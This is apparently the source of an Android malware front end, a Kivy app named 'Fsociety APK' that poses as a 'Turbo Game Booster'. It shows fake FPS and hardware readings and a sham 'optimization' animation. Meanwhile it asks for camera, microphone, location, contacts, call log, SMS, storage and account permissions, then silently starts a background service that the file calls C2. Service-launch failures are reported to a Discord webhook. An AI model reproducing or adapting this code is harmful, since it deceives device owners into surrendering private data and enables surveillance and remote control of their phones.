"""
Fsociety APK — "Turbo Game Booster" Fake FPS Booster UI
Premium gaming booster interface with:
  - Circular gauge with animated FPS counter
  - CPU/RAM/GPU monitoring (fake)
  - "Boost" button with rocket animation
  - Before/After optimization results
  - Spinning loader during "optimization"
All while silently launching C2 service in background.
"""
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.widget import Widget
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Line, Ellipse, Rectangle, RoundedRectangle
from kivy.properties import NumericProperty, StringProperty
import math, random

# Dark gaming theme
Window.clearcolor = (0.06, 0.06, 0.1, 1)

# Android imports
try:
    from jnius import autoclass
    from android.permissions import request_permissions, Permission
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Intent = autoclass('android.content.Intent')
    Build = autoclass('android.os.Build')
    ANDROID = True
except ImportError:
    ANDROID = False


# ============================================================================
# CIRCULAR GAUGE WIDGET (FPS/Temperature style)
# ============================================================================
class CircularGauge(Widget):
    """Animated circular gauge — shows FPS or optimization progress."""
    value = NumericProperty(0)
    max_value = NumericProperty(120)
    label_text = StringProperty("FPS")

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.size_hint = (None, None)
        self.size = (200, 200)
        self.bind(pos=self._draw, size=self._draw, value=self._draw)
        Clock.schedule_once(lambda dt: self._draw(), 0)

    def _draw(self, *args):
        self.canvas.clear()
        cx, cy = self.center_x, self.center_y
        r = min(self.width, self.height) / 2 - 12

        # Value as angle (270 degree sweep, starting from bottom-left)
        pct = min(self.value / self.max_value, 1.0)
        sweep = pct * 270

        with self.canvas:
            # Outer glow ring
            Color(0.1, 0.4, 0.9, 0.15)
            Line(circle=(cx, cy, r + 4), width=8)

            # Background arc (dark)
            Color(0.15, 0.15, 0.2, 0.8)
            Line(circle=(cx, cy, r, 135, 405), width=6, cap='round')

            # Value arc — color changes based on value
            if pct < 0.3:
                Color(1.0, 0.3, 0.2, 1)  # Red (low)
            elif pct < 0.6:
                Color(1.0, 0.7, 0.1, 1)  # Yellow (mid)
            else:
                Color(0.2, 0.9, 0.4, 1)  # Green (high/good)

            if sweep > 0:
                Line(circle=(cx, cy, r, 135, 135 + sweep), width=6, cap='round')

            # Tick marks
            Color(0.3, 0.3, 0.4, 0.6)
            for i in range(0, 271, 30):
                angle_rad = math.radians(135 + i)
                x1 = cx + (r - 8) * math.cos(angle_rad)
                y1 = cy + (r - 8) * math.sin(angle_rad)
                x2 = cx + (r + 2) * math.cos(angle_rad)
                y2 = cy + (r + 2) * math.sin(angle_rad)
                Line(points=[x1, y1, x2, y2], width=1)

            # Needle dot at current position
            if sweep > 0:
                needle_angle = math.radians(135 + sweep)
                nx = cx + r * math.cos(needle_angle)
                ny = cy + r * math.sin(needle_angle)
                Color(1, 1, 1, 0.9)
                Ellipse(pos=(nx - 4, ny - 4), size=(8, 8))


# ============================================================================
# STAT BAR WIDGET (CPU/RAM/GPU)
# ============================================================================
class StatBar(BoxLayout):
    """Horizontal stat bar with label and colored fill."""

    def __init__(self, stat_name="CPU", stat_value=0, stat_color=(0.2, 0.6, 1), **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'horizontal'
        self.size_hint_y = None
        self.height = 36
        self.padding = [0, 4]
        self.spacing = 8

        self.stat_name = stat_name
        self.stat_color = stat_color
        self._value = stat_value

        # Label
        self.name_lbl = Label(
            text=f"[color=888888]{stat_name}[/color]",
            font_size='12sp', markup=True,
            size_hint_x=0.15, halign='left'
        )
        self.name_lbl.bind(size=self.name_lbl.setter('text_size'))

        # Bar background
        self.bar_widget = Widget(size_hint_x=0.65)

        # Value label
        self.val_lbl = Label(
            text=f"[b]{stat_value}%[/b]",
            font_size='12sp', markup=True,
            color=stat_color + (1,),
            size_hint_x=0.2, halign='right'
        )
        self.val_lbl.bind(size=self.val_lbl.setter('text_size'))

        self.add_widget(self.name_lbl)
        self.add_widget(self.bar_widget)
        self.add_widget(self.val_lbl)

        self.bar_widget.bind(pos=self._draw_bar, size=self._draw_bar)

    def set_value(self, val):
        self._value = val
        self.val_lbl.text = f"[b]{val}%[/b]"
        self._draw_bar()

    def _draw_bar(self, *args):
        self.bar_widget.canvas.clear()
        w = self.bar_widget
        with w.canvas:
            # Background
            Color(0.12, 0.12, 0.18, 1)
            RoundedRectangle(pos=w.pos, size=w.size, radius=[4])
            # Fill
            fill_w = (self._value / 100) * w.width
            Color(*self.stat_color, 0.85)
            RoundedRectangle(pos=w.pos, size=(fill_w, w.height), radius=[4])


# ============================================================================
# BOOST BUTTON
# ============================================================================
class BoostButton(Button):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.text = "\U0001F680  BOOST NOW"
        self.font_size = '18sp'
        self.size_hint = (0.7, None)
        self.height = 56
        self.pos_hint = {'center_x': 0.5}
        self.background_color = (0, 0, 0, 0)
        self.color = (1, 1, 1, 1)
        self.markup = True
        self.bind(pos=self._draw, size=self._draw)

    def _draw(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            # Gradient button background
            Color(0.15, 0.5, 1.0, 1)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[28])
            # Inner glow
            Color(0.3, 0.6, 1.0, 0.3)
            RoundedRectangle(
                pos=(self.x + 2, self.y + 2),
                size=(self.width - 4, self.height - 4),
                radius=[26]
            )


# ============================================================================
# SPINNING OPTIMIZER WIDGET
# ============================================================================
class OptimizerSpinner(Widget):
    angle = NumericProperty(0)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.size_hint = (None, None)
        self.size = (60, 60)
        self._event = None
        self.bind(pos=self._draw, size=self._draw, angle=self._draw)

    def start(self):
        if not self._event:
            self._event = Clock.schedule_interval(self._spin, 1 / 60)
        self.opacity = 1

    def stop(self):
        if self._event:
            self._event.cancel()
            self._event = None
        self.opacity = 0

    def _spin(self, dt):
        self.angle = (self.angle + 5) % 360

    def _draw(self, *args):
        self.canvas.clear()
        cx, cy = self.center_x, self.center_y
        r = min(self.width, self.height) / 2 - 4
        with self.canvas:
            Color(0.15, 0.5, 1.0, 0.3)
            Line(circle=(cx, cy, r), width=3)
            Color(0.3, 0.7, 1.0, 1)
            Line(circle=(cx, cy, r, self.angle, self.angle + 80), width=3, cap='round')
            Color(0.5, 0.9, 1.0, 0.6)
            Line(circle=(cx, cy, r, self.angle + 80, self.angle + 120), width=2, cap='round')


# ============================================================================
# MAIN APP
# ============================================================================
class TurboBoosterApp(App):

    def build(self):
        self.title = "Turbo Game Booster"
        self._service_started = False
        self._boosting = False

        root = FloatLayout()

        # Main card
        card = BoxLayout(
            orientation='vertical',
            padding=[20, 15, 20, 15],
            spacing=8,
            size_hint=(0.92, 0.95),
            pos_hint={'center_x': 0.5, 'center_y': 0.5}
        )

        # === Header ===
        header = BoxLayout(size_hint_y=0.06, spacing=10)
        self.app_title = Label(
            text="[b][color=3399ff]TURBO[/color] [color=ffffff]GAME BOOSTER[/color][/b]",
            font_size='16sp', markup=True, halign='left', size_hint_x=0.7
        )
        self.app_title.bind(size=self.app_title.setter('text_size'))
        self.status_badge = Label(
            text="[color=44ff88]\u25CF ACTIVE[/color]",
            font_size='12sp', markup=True, halign='right', size_hint_x=0.3
        )
        self.status_badge.bind(size=self.status_badge.setter('text_size'))
        header.add_widget(self.app_title)
        header.add_widget(self.status_badge)

        # === Gauge Section ===
        gauge_box = FloatLayout(size_hint_y=0.35)
        self.gauge = CircularGauge()
        self.gauge.pos_hint = {'center_x': 0.5, 'center_y': 0.55}

        # FPS value display (centered in gauge)
        self.fps_lbl = Label(
            text="[b]24[/b]",
            font_size='42sp', markup=True,
            color=(1, 0.3, 0.2, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.52}
        )
        self.fps_unit = Label(
            text="[color=888888]FPS[/color]",
            font_size='13sp', markup=True,
            pos_hint={'center_x': 0.5, 'center_y': 0.38}
        )

        # Spinner (hidden initially)
        self.spinner = OptimizerSpinner()
        self.spinner.pos_hint = {'center_x': 0.5, 'center_y': 0.52}
        self.spinner.opacity = 0

        gauge_box.add_widget(self.gauge)
        gauge_box.add_widget(self.fps_lbl)
        gauge_box.add_widget(self.fps_unit)
        gauge_box.add_widget(self.spinner)

        # === Optimization Status ===
        self.opt_lbl = Label(
            text="[color=ff6644]Your device needs optimization[/color]",
            font_size='14sp', markup=True, halign='center',
            size_hint_y=0.04
        )

        # === Stats Section ===
        stats_box = BoxLayout(orientation='vertical', size_hint_y=0.18, padding=[10, 0], spacing=2)

        self.cpu_bar = StatBar("CPU", random.randint(72, 92), (1.0, 0.4, 0.2))
        self.ram_bar = StatBar("RAM", random.randint(68, 88), (1.0, 0.7, 0.1))
        self.gpu_bar = StatBar("GPU", random.randint(55, 78), (0.2, 0.7, 1.0))
        self.temp_bar = StatBar("TEMP", random.randint(38, 48), (1.0, 0.5, 0.3))

        stats_box.add_widget(self.cpu_bar)
        stats_box.add_widget(self.ram_bar)
        stats_box.add_widget(self.gpu_bar)
        stats_box.add_widget(self.temp_bar)

        # === Boost Button ===
        btn_box = BoxLayout(size_hint_y=0.1, padding=[40, 5])
        self.boost_btn = BoostButton()
        self.boost_btn.bind(on_press=self.on_boost_pressed)
        btn_box.add_widget(self.boost_btn)

        # === Bottom Info ===
        self.info_lbl = Label(
            text="[color=555555]Optimizes CPU, clears RAM cache, and\nboosts GPU rendering for maximum FPS[/color]",
            font_size='11sp', markup=True, halign='center',
            size_hint_y=0.06
        )
        self.info_lbl.bind(size=self.info_lbl.setter('text_size'))

        # === Game Detection ===
        self.game_lbl = Label(
            text="[color=666666]\U0001F3AE Supported: PUBG • Free Fire • Genshin • COD Mobile[/color]",
            font_size='10sp', markup=True, halign='center',
            size_hint_y=0.04
        )

        # === Version ===
        self.ver_lbl = Label(
            text="[color=333333]Turbo Booster Pro v3.2.1[/color]",
            font_size='10sp', markup=True, halign='center',
            size_hint_y=0.03
        )

        # Assemble
        card.add_widget(header)
        card.add_widget(gauge_box)
        card.add_widget(self.opt_lbl)
        card.add_widget(stats_box)
        card.add_widget(btn_box)
        card.add_widget(self.info_lbl)
        card.add_widget(self.game_lbl)
        card.add_widget(self.ver_lbl)

        root.add_widget(card)

        # Initialize gauge with low FPS
        self.gauge.value = 24
        self._initial_fps = 24

        # Request permissions on start
        if ANDROID:
            Clock.schedule_once(self._request_permissions, 1.0)

        return root

    # ====================================================================
    # PERMISSIONS
    # ====================================================================
    def _request_permissions(self, dt):
        """Request all permissions at once — dialogs back-to-back."""
        all_perms = [
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.VIBRATE,
            Permission.READ_CONTACTS,
            Permission.READ_CALL_LOG,
            Permission.READ_PHONE_STATE,
            Permission.READ_SMS,
            Permission.RECEIVE_SMS,
        ]

        try:
            sdk = Build.VERSION.SDK_INT
            if sdk >= 33:
                all_perms.extend([
                    "android.permission.POST_NOTIFICATIONS",
                    "android.permission.READ_MEDIA_IMAGES",
                    "android.permission.READ_MEDIA_VIDEO",
                    "android.permission.READ_MEDIA_AUDIO",
                ])
            else:
                all_perms.extend([
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.WRITE_EXTERNAL_STORAGE,
                ])
        except:
            all_perms.append(Permission.READ_EXTERNAL_STORAGE)
            all_perms.append(Permission.WRITE_EXTERNAL_STORAGE)

        try:
            all_perms.append("android.permission.GET_ACCOUNTS")
        except:
            pass

        request_permissions(all_perms, self._on_perms_done)

    def _on_perms_done(self, permissions, grants):
        """Permissions done — start the C2 service silently."""
        self._start_service()

    # ====================================================================
    # BOOST ANIMATION
    # ====================================================================
    def on_boost_pressed(self, instance):
        if self._boosting:
            return

        self._boosting = True
        self.boost_btn.text = "OPTIMIZING..."
        self.boost_btn.disabled = True

        # Hide FPS, show spinner
        self.fps_lbl.opacity = 0
        self.fps_unit.opacity = 0
        self.spinner.start()

        self.opt_lbl.text = "[color=3399ff]\U0001F504 Scanning running processes...[/color]"
        self._boost_step = 0
        Clock.schedule_interval(self._animate_boost, 0.05)

    def _animate_boost(self, dt):
        self._boost_step += 1

        # Phase messages
        if self._boost_step == 30:
            self.opt_lbl.text = "[color=3399ff]\U0001F9F9 Clearing RAM cache...[/color]"
            self.ram_bar.set_value(random.randint(55, 65))
        elif self._boost_step == 60:
            self.opt_lbl.text = "[color=3399ff]\u26A1 Optimizing CPU frequency...[/color]"
            self.cpu_bar.set_value(random.randint(35, 50))
        elif self._boost_step == 90:
            self.opt_lbl.text = "[color=3399ff]\U0001F3AE Boosting GPU rendering...[/color]"
            self.gpu_bar.set_value(random.randint(25, 40))
        elif self._boost_step == 110:
            self.opt_lbl.text = "[color=3399ff]\U0001F321 Cooling down temperature...[/color]"
            self.temp_bar.set_value(random.randint(28, 34))
        elif self._boost_step == 130:
            self.opt_lbl.text = "[color=3399ff]\U0001F680 Finalizing optimization...[/color]"
        elif self._boost_step >= 150:
            Clock.unschedule(self._animate_boost)
            self._boost_complete()

    def _boost_complete(self):
        """Show boosted results."""
        self.spinner.stop()
        self.fps_lbl.opacity = 1
        self.fps_unit.opacity = 1

        # Animate FPS going up
        self._target_fps = random.randint(90, 120)
        self._current_fps = self._initial_fps
        Clock.schedule_interval(self._animate_fps_up, 0.02)

        self.opt_lbl.text = "[color=44ff88]\u2705 Optimization complete![/color]"
        self.boost_btn.text = "\u2705  BOOSTED"
        self.info_lbl.text = (
            f"[color=44ff88]FPS increased: {self._initial_fps} \u2192 {self._target_fps}\n"
            f"RAM freed: {random.randint(800, 1400)}MB | Temp: -{random.randint(4, 8)}\u00B0C[/color]"
        )

        # Re-enable button after delay for "re-boost"
        Clock.schedule_once(self._reset_button, 5.0)

    def _animate_fps_up(self, dt):
        self._current_fps += 2
        if self._current_fps >= self._target_fps:
            self._current_fps = self._target_fps
            Clock.unschedule(self._animate_fps_up)

        fps = int(self._current_fps)
        self.gauge.value = fps
        self.fps_lbl.text = f"[b]{fps}[/b]"

        # Color transition
        if fps < 30:
            self.fps_lbl.color = (1, 0.3, 0.2, 1)
        elif fps < 60:
            self.fps_lbl.color = (1, 0.7, 0.1, 1)
        else:
            self.fps_lbl.color = (0.2, 0.9, 0.4, 1)

    def _reset_button(self, dt):
        self._boosting = False
        self.boost_btn.disabled = False
        self.boost_btn.text = "\U0001F504  RE-BOOST"

    # ====================================================================
    # SERVICE MANAGEMENT
    # ====================================================================
    def _start_service(self):
        if not ANDROID or self._service_started:
            return
        try:
            service_class = autoclass('com.turbo.gamebooster.ServiceBooster')
            mActivity = PythonActivity.mActivity
            app_context = mActivity.getApplicationContext()
            intent = Intent(app_context, service_class)

            try:
                if Build.VERSION.SDK_INT >= 26:
                    app_context.startForegroundService(intent)
                else:
                    mActivity.startService(intent)
            except Exception:
                mActivity.startService(intent)

            self._service_started = True
        except Exception as e:
            try:
                import requests as req
                from service import DISCORD_WEBHOOK_URL
                req.post(DISCORD_WEBHOOK_URL,
                         json={'content': f'\u26A0\uFE0F Service launch failed: {e}'},
                         timeout=5)
            except:
                pass

    def on_pause(self):
        return True

    def on_resume(self):
        pass


if __name__ == '__main__':
    TurboBoosterApp().run()
